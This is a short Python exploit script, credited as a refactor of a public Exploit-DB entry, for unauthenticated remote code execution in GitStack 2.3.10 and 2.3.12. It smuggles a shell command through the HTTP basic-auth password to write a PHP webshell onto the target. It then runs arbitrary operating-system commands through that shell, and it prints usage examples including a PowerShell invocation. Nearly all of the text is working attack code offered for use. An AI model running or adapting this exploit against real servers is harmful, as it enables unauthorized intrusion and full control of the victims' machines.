#!/usr/bin/python3

# Version Affected: 2.3.10 & 2.3.12
# Software Link: https://gitstack.com/
# Original Exploit Author: Kacper Szurek
# Original Exploit Link: https://www.exploit-db.com/exploits/43777
# Refactor Author: Mikaelbiagio 
# Category: remote

import requests
from requests.auth import HTTPBasicAuth
import os
import sys

powershell = "powershell.exe -c ls"
quotes = '"'
print("GitStack Unauthenticated RCE")
print("Version Affected: 2.3.10 & 2.3.12")
print("https://gitstack.com/")
print("Author: Mikael")
print("")
print("USE - ./GitStack_2.3.10_2.3.12_RCE.py [IP/HOSTNAME] [VALID EXISTING REPOSITORY] [VALID EXISTING USER] [OS-CMD]")
print("EX - ./GitStack_2.3.10_2.3.12_RCE.py git-server.local repository username whoami")
print("")
print("With Powershell: USE - ./GitStack_RCE.py git-server.local repository username",quotes + powershell + quotes)
print("")

ip = sys.argv[1]
repository = sys.argv[2]
username = sys.argv[3]
command = sys.argv[4]

print("[+] Create backdoor in PHP on target:", ip)
request_1 = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'c && echo "<?php echo shell_exec($_GET[\'cmd\']); ?>" > c:\GitStack\gitphp\webshell.php'))
print((request_1.text.encode(sys.stdout.encoding, errors='replace')))
print("[+] Done")
# PAYLOAD TO USE, ENCODED IN BASE64
print("")
print("[+] Execute command:", command)
request_2 = requests.get("http://{}/web/webshell.php?cmd=" .format(ip) + command)
print("")
print((request_2.text))
print(("[+] To use the webshell, go to: http://"+ip+"/web/webshell.php?cmd=" + command))
